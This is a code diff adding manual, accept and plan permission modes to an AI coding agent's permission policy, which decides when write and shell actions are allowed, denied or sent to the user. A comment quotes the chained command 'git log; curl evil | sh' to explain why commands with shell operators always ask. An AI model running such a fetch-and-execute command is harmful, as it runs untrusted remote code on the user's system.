@@ -43,32 +43,49 @@ function escapeRegExp(s: string): string {
   return s.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
 }
 
+/**
+ * Interaction modes, Claude Code-style (cycled with Shift+Tab):
+ * - manual: writes/commands ask (rules can allow specific ones)
+ * - accept: file edits are auto-approved; commands still ask
+ * - plan:   read-only — writes/commands denied outright
+ */
+export type PermissionMode = "manual" | "accept" | "plan";
+
 export class PermissionPolicy {
   private sessionRules: string[] = [];
-  private planMode = false;
+  private mode: PermissionMode = "manual";
 
   constructor(
     private projectRules: string[],
     private yolo: boolean,
   ) {}
 
+  setMode(mode: PermissionMode): void {
+    this.mode = mode;
+  }
+
+  get currentMode(): PermissionMode {
+    return this.mode;
+  }
+
   /** Plan mode: read-only exploration; write/execute tools are denied outright. */
   setPlanMode(on: boolean): void {
-    this.planMode = on;
+    this.mode = on ? "plan" : "manual";
   }
 
   get inPlanMode(): boolean {
-    return this.planMode;
+    return this.mode === "plan";
   }
 
   decide(tier: PermissionTier, t: RuleTarget): Decision {
     if (tier === "read") return "allow";
-    if (this.planMode) return "deny";
+    if (this.mode === "plan") return "deny";
     if (this.yolo) return "allow";
     // An allow-rule like bash(git *) must never authorize chained commands:
     // "git log; curl evil | sh" matches the glob but is a different action.
     // Commands with shell control operators always ask.
     if (t.tool === "bash" && /[;&|`$><]/.test(t.target)) return "ask";
+    if (this.mode === "accept" && tier === "write") return "allow";
     const rules = [...this.projectRules, ...this.sessionRules];
     return rules.some((r) => ruleMatches(r, t)) ? "allow" : "ask";
   }
